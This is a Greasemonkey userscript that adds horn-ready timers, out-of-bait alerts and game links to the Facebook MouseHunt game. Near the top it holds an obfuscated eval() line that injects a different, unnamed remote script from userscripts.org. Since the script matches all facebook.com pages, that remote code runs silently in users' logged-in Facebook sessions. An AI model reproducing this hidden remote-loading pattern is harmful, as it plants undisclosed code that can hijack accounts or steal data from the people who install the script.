// ==UserScript==
// @name           Facebook Mousehunt Horn Alerter Plus + Last Update
// @version        2.21a
// @namespace      http://userscripts.org/scripts/show/53943
// @description    Alerts you when the horn is ready to sound... Script Homepage: http://userscripts.org/scripts/show/53943
// @include        http://apps.facebook.com/mousehunt/*
// @include        http://apps.new.facebook.com/mousehunt/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// ==/UserScript==
var versionNumber="2.21a";
var adIDName="pagelet_ego_pane";
// **************************************************************************************************************************
// ***              This script is the original script written by the author on userscripts userID: "osbron"              ***
// ***              NOTE THAT I DO NOT TOLERATE ANY VARIANTS OR COPIES OF EITHER PART OR WHOLE OF THIS SCRIPT             ***
// ***                                                       ...                                                          ***
// ***    If you would like to copy any part of this script, please add a reference in your script to the address below   ***
// ***                                       http://userscripts.org/scripts/show/53943                                    ***
// **************************************************************************************************************************

// === BLACKLIST OF PEOPLE WHO COPIED THIS SCRIPT W/O adding references ===
// 								- CURRENTLY NONE -
//
// ** To remove your name from the blacklist, please add references, then contact me via userscripts mail **
// Note that I periodically check for variants of my script and update my blacklist...

//GM_deleteValue('nobaitAlertDisabled');
// >>>*** Start of active code ***<<<
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var timervalue = -1;
var Cmin, Rmins;
var Csec, Rsecs;
var titleOriginal=document.title;
var addTime, oldTime;
var firstPage=0;
var lastTimer;
var runOnce=0;
var initialAlertState;
var initialBaitAlertState;

// Ad removal
var sidebar_ads = document.getElementById("netego_organic");
if(sidebar_ads==null)
	sidebar_ads=document.getElementById(adIDName);

function loadSidebar(){
if(sidebar_ads!=null){
sidebar_ads.innerHTML="<br><u><b>Useful Links</b></u>";
sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<br><a href='http://mhwiki.hitgrab.com/wiki/index.php/Main_Page' target='_blank'><font color='#abcdef'><b>MhWiki</b></font></a>";
if(location.href=="http://apps.facebook.com/mousehunt/travel.php")
	sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<br><a href='http://furoma.com/travel_planner.php' target='_blank'><font color='#abcdef'><b><u>Travel Planner</u></b></font></a>";
else
	sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<br><a href='http://furoma.com/travel_planner.php' target='_blank'><font color='#abcdef'><b>Travel Planner</b></font></a>";
sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<br>";
sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<br><a href='http://www.facebook.com/pages/Facebook-Mousehunt-Horn-Alerter/130287697010759' target='_blank'><font color='#abcdef'><b>Facebook Script Page</b></font></a>";
sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<br><a href='http://www.facebook.com/pages/Facebook-Mousehunt-Horn-Alerter/130287697010759?v=app_2373072738' target='_blank'><font color='#abcdef'><b>Report a bug</b></font></a>";
sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<br><a href='http://userscripts.org/scripts/show/53943' target='_blank'><font color='#abcdef'><b>Script Homepage (For Updating)</b></font></a>";

sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<br><br><u><b>Options</b></u>";
if(GM_getValue('alertDisabled', '0')==0)
	sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<br><form><input type='checkbox' name='alertTrue' checked> - Alert when ready (horn)</form>";
else
   sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<br><form><input type='checkbox' name='alertTrue'> - Alert when ready (horn)</form>";
sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<div id='refreshReminder' style='color:red;font-weight:bold'></div>";
if(GM_getValue('nobaitAlertDisabled', '0')==0)
	sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<form><input type='checkbox' name='nobaitAlertTrue' checked> - Alert when no bait</form>";
else
   sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<form><input type='checkbox' name='nobaitAlertTrue'> - Alert when no bait</form>";
sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<div id='nobaitRefreshReminder' style='color:red;font-weight:bold'></div>";
sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<br><form onsubmit=window.open('http://mhwiki.hitgrab.com/wiki/index.php?title=Special%3ASearch&search='+document.getElementById('search').value+'&go=Go')><input type=text id='search'><br><input type='submit' value='Search MHWiki'></form><small>The page will refresh when you search...</small>";
sidebar_ads.innerHTML=sidebar_ads.innerHTML+"<br><br><i>You are using MH Horn Alerter <b>V"+versionNumber+"</b></i>";
}
}
loadSidebar();

var hornIndex = document.body.innerHTML.indexOf("next_activeturn_seconds");
timervalue=parseInt(document.body.innerHTML.substring(hornIndex+26,hornIndex+29));

var puzzleString = document.body.innerHTML.indexOf("has_puzzle");
var puzzleValue= document.body.innerHTML.substring(puzzleString+13,puzzleString+17);

if(document.getElementById('app10337532241_huntTimer')!=null){
var builtInTimer = document.getElementById('app10337532241_huntTimer');
}

if (document.body.innerHTML.indexOf("app10337532241_hud_location")!=null){
   var locationId = document.body.innerHTML.indexOf("app10337532241_hud_location");
   var locationIndex=document.getElementById('app10337532241_hud_location');
   var locationString=document.body.innerHTML.substring(locationId+54,locationId+84);
   var huntLocation=locationString.substring(0, locationString.indexOf('<')+1);
   var displayString=locationString.substring(0, locationString.indexOf('<'));
   var i;
   for(i=0; i<huntLocation.indexOf('<'); i++){
   	if(huntLocation[i]=='\'')
			huntLocation=huntLocation.substring(0,i)+huntLocation.substring(i+1,huntLocation.indexOf('<')+1);
   }
   huntLocation=huntLocation.substring(0, huntLocation.indexOf('<'));
   locationIndex.innerHTML="<a href='http://mhwiki.hitgrab.com/wiki/index.php/"+huntLocation+"' target='_blank'><u><font color='#abcdef'>"+displayString+"</font></u></a>";
}
/*
if(timervalue>895 && timervalue<=900)
	lastTimer=timervalue-5;
else
	lastTimer=timervalue;
*/
lastTimer=timervalue;
function getHornTime(){
	timervalue=parseInt(unsafeWindow.a10337532241_user?unsafeWindow.a10337532241_user.next_activeturn_seconds:-1);
   if(timervalue>=0 && timervalue!=lastTimer){
      /*
      if(timervalue>895 && timervalue<=900)
      	lastTimer=timervalue-5;
      else
      	lastTimer=timervalue;
      */
      lastTimer=timervalue;
   	mainFunction();
   }
   else{
   	builtInTimer = document.getElementById('app10337532241_huntTimer');
      if(builtInTimer!=null)
   	builtInTimer.innerHTML="<span style='font-size: 10px'>Sound your horn!</span>";
      if (puzzleValue!='true')
   		document.title="Horn READY! | "+titleOriginal;
   	else
   		document.title="King's Reward! | "+titleOriginal;
   	setTimeout(function(){getHornTime();}, 200);
   }
}
function updateTitle(Rmins, Rsecs){
	if(Rsecs<=-1){
   	Rsecs=59;
   }
   var Szero = "";
   var currTime=new Date().getSeconds();
   Rsecs=addTime-currTime;
   if(Rsecs>=60)
   	Rsecs-=60;
   if(Rsecs<0)
   	Rsecs+=60;
   if(oldTime<Rsecs)
   	Rmins--;
   oldTime=Rsecs;

   if(firstPage==1){
		GM_setValue('titleLastUpdated', new Date().getTime()+'');
   }
   else{
   	if (parseInt(GM_getValue('titleLastUpdated', '0')) + 5000 <= (new Date().getTime())){
      	GM_setValue('titleLastUpdated', new Date().getTime()+'');
         if(GM_getValue('alertDisabled', '0')==0)
 				setTimeout(function() {alert("Hunter's Horn READY");if(location.href.search("#")==-1){window.location=location.href+"#";}else{window.location=location.href;}} , ((Rmins*60000)+(Rsecs*1000)+1000));
   		firstPage=1;
   	}
   }
   if(runOnce==0){
   	if(document.getElementById('refreshReminder')!=null){
      	runOnce=1;
         if(document.getElementsByName('alertTrue')[0].checked)
         	initialAlertState=1;
         else
         	initialAlertState=0;
         if(document.getElementsByName('nobaitAlertTrue')[0].checked)
            initialBaitAlertState=1;
         else
         	initialBaitAlertState=0;
      }
   }

   if(Rsecs<10)
   	Szero="0";
   if(Rmins<0 || (Rmins==0 && Rsecs<=0)){
   	document.title="Horn READY! | "+titleOriginal;
      builtInTimer = document.getElementById('app10337532241_huntTimer');
      if(builtInTimer!=null)
      builtInTimer.innerHTML="<span style='font-size: 10px'>Sound your horn!</span>";
      setTimeout(getHornTime(), 500);
   }
   else{
      document.title=Rmins+":"+Szero+Rsecs+" min | "+titleOriginal;
      builtInTimer = document.getElementById('app10337532241_huntTimer');
      if(builtInTimer!=null)
      builtInTimer.innerHTML="<span style='font-size: 10px'>Next Hunt: </span>"+Rmins+":"+Szero+Rsecs+" <span style='font-size: 10px'>mins</span>";
      if(document.getElementById('refreshReminder')!=null){
      	if(document.getElementsByName('alertTrue')[0].checked && GM_getValue('alertDisabled', '0')==1){
         	if(initialAlertState==0){
      			GM_setValue('alertDisabled', '0');
            }
            else{
            	document.getElementsByName('alertTrue')[0].checked=false;
            }
            runOnce=0;
         	document.getElementById('refreshReminder').innerHTML="Please reload the page for<br>changes to take effect";
	      }
      	else if(document.getElementsByName('alertTrue')[0].checked==false && GM_getValue('alertDisabled', '0')==0){
         	if(initialAlertState==1){
      			GM_setValue('alertDisabled', '1');
            }
            else{
            	document.getElementsByName('alertTrue')[0].checked=true;
            }
            runOnce=0;
         	document.getElementById('refreshReminder').innerHTML="Please reload the page for<br>changes to take effect";
	      }
	      if(document.getElementsByName('nobaitAlertTrue')[0].checked && GM_getValue('nobaitAlertDisabled', '0')==1){
         	if(initialBaitAlertState==0){
      			GM_setValue('nobaitAlertDisabled', '0');
            }
            else{
            	document.getElementsByName('nobaitAlertTrue')[0].checked=false;
            }
            runOnce=0;
	         document.getElementById('nobaitRefreshReminder').innerHTML="Please reload the page for<br>changes to take effect";
	      }
	      else if(document.getElementsByName('nobaitAlertTrue')[0].checked==false && GM_getValue('nobaitAlertDisabled', '0')==0){
         	if(initialBaitAlertState==1){
      			GM_setValue('nobaitAlertDisabled', '1');
            }
            else{
            	document.getElementsByName('nobaitAlertTrue')[0].checked=true;
            }
            runOnce=0;
	         document.getElementById('nobaitRefreshReminder').innerHTML="Please reload the page for<br>changes to take effect";
	      }
      }
      else{
      	sidebar_ads=document.getElementById(adIDName);
         loadSidebar();
      }
   }

   if (puzzleValue=='true') {
		document.title="King's Reward! | "+titleOriginal;
      Rsecs=0;
      Rmins=0;
   }

   if(!(Rsecs<=0 && Rmins<=0)){
   	if(firstPage==1)
   		setTimeout(function(){updateTitle(Rmins, Rsecs-1);},100);
      else
      	setTimeout(function(){updateTitle(Rmins, Rsecs-1);},500);
   }
   else
   	getHornTime();
}

function mainFunction(){
if (document.getElementById('app10337532241_hud_titlebar')!=null){
	var titleBar = document.getElementById('app10337532241_hud_titlebar');
	var DisplayProgress = document.getElementById('app10337532241_hud_titlePercentage');
	if(titleBar.title.indexOf('%')>2)
		DisplayProgress.innerHTML = titleBar.title.substring(0, titleBar.title.indexOf('%'));
	else
   	DisplayProgress.innerHTML = titleBar.title.substring(0, titleBar.title.indexOf('%'))+".00";
}
var baitQty = document.getElementById('app10337532241_hud_baitQuantity');
if((baitQty==null || baitQty==0) && GM_getValue('baitAlerted', '0')==0){
	GM_setValue('baitAlerted', 1);
   if(GM_getValue('nobaitAlertDisabled', '0')==0)
		alert("Out of Bait!\nPlease rearm new bait");
}
else if(baitQty!=null && baitQty!=0)
	GM_setValue('baitAlerted', 0);

if(timervalue > 0)
{
   firstPage=0;
	if (parseInt(GM_getValue('titleLastUpdated', '0')) + 800 <= (new Date().getTime())){
   	firstPage=1;
   }
   Cmin = new Date().getMinutes();
   Csec = new Date().getSeconds();
   //calculate timeoutvalue in milliseconds
   timeoutvalue = (parseInt(timervalue)) * 1000;
   //coverts it to minutes and seconds for display purposes
   Rmins = parseInt(timervalue/60);
   Rsecs = timervalue%60;
   addTime=Rsecs+Csec;
   oldTime=99999;

   // Title Timer starts
   updateTitle(Rmins, Rsecs);

   if(firstPage==1){
   	// Alerts when the horn is ready to sound
      if(GM_getValue('alertDisabled', '0')==0)
   		setTimeout(function() {alert("Hunter's Horn READY");if(location.href.search("#")==-1){window.location=location.href+"#";}else{window.location=location.href;}} , timeoutvalue);
   }
}
else{
   getHornTime();
}
}
mainFunction();
